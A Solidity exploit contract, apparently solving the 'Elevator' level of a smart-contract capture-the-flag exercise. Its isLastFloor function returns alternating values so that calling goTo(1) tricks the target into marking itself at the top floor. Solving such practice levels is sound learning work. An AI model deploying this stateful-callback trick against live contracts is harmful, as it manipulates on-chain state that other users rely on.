// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Elevator.sol";

contract MaliciousBuilding is Building {
    bool private toggle = true;
    Elevator private elevator;
    
    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }
    
    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }
    
    function exploit() public {
        elevator.goTo(1);
    }
}